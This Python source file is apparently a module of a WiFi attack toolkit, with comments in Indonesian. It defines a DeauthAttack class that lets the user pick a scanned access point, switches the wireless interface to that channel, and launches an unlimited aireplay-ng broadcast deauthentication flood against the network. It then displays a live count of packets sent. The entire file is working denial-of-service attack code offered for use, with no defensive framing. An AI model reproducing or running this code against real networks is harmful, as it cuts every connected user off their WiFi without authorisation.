import os
import sys
import time
import subprocess

class DeauthAttack:
    def __init__(self, manager, colors):
        """
        Inisialisasi modul attack.
        :param manager: Referensi ke WirelessManager
        :param colors: Referensi ke objek colors global
        """
        self.manager = manager
        self.colors = colors

    def start_dos(self, targets):
        """WiFi Pro - Direct Broadcast Deauth"""
        c = self.colors
        if not targets:
            print(f"\n{c.ERR} {c.R}Target list is empty. Scan first (01).{c.NC}")
            return

        try:
            # Step 1: Pilih Target
            print(f"\n{c.Q} Select Target ID to Broadcast (1-{len(targets)}):")
            val = input(f"  {c.DG}Selection > {c.NC}").strip()
            if not val: return
            
            target = targets[int(val) - 1]
            ctx = {
                'bssid': target.get('bssid'),
                'ch': target.get('ch'),
                'essid': target.get('essid', 'Unknown'),
                'iface': self.manager.iface 
            }

            # Step 2: Langsung Eksekusi Broadcast Attack
            cmd = f"stdbuf -oL iw dev {ctx['iface']} set channel {ctx['ch']} && stdbuf -oL aireplay-ng -0 0 -a {ctx['bssid']} --ignore-negative-one {ctx['iface']}"
            self._execute_attack(ctx['essid'], ctx['bssid'], cmd)

        except (ValueError, IndexError):
            print(f"{c.ERR} Invalid Target ID.")
            time.sleep(1)

    def _execute_attack(self, essid, bssid, cmd):
        """WiFi Pro - Broadcast Attack Engine"""
        import sys, time
        c = self.colors
        
        # Header Status
        print(f"\n  {c.BOLD}{c.W}MODULE:{c.NC} {c.C}BROADCAST_DEAUTH{c.NC}")
        print(f"  {c.BOLD}{c.W}TARGET:{c.NC} {c.Y}{essid}{c.NC} {c.DG}({bssid}){c.NC}")
        print(f"  {c.INFO} {c.R}Press CTRL+C to Stop Attack{c.NC}")
        print(f"  {c.DG}─────────────────────────────────────────────{c.NC}")

        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
            universal_newlines=True, bufsize=1
        )

        sent_packets = 0
        start_time = time.time()
        interrupted = False

        try:
            while True:
                line = process.stdout.readline()
                current_time = time.time()
                
                # Deteksi paket yang terkirim dari output aireplay
                if line and any(x in line for x in ["Sending", "DeAuth", "ACK"]):
                    sent_packets += 1
                
                # Animasi Loading Bar
                bar_idx = int((current_time * 8) % 20)
                bar = "░" * bar_idx + "█" + "░" * (19 - bar_idx)
                
                status = (
                    f"\r  {c.OK} {c.W}Status: {c.G}[{bar}]{c.NC} "
                    f"{c.W}Sent: {c.Y}{sent_packets:04d}{c.NC} "
                    f"{c.DG}({int(current_time - start_time)}s){c.NC}"
                )

                sys.stdout.write(status)
                sys.stdout.flush()

                if process.poll() is not None: break
                if not line: time.sleep(0.01)

        except KeyboardInterrupt:
            interrupted = True

        # Finalisasi
        process.terminate()
        
        # Bersihkan baris status terakhir
        sys.stdout.write("\r" + " " * 85 + "\r")
        sys.stdout.flush()

        if interrupted:
            print(f"{c.WARN} {c.R}Attack Interrupted Manually by User.{c.NC}")
        
        print(f"{c.OK} {c.G}Sequence Finished. Total Packets Sent: {c.W}{sent_packets}{c.NC}")
        input(f"  {c.DG}Press {c.W}[Enter]{c.DG} to return to dashboard...{c.NC}")
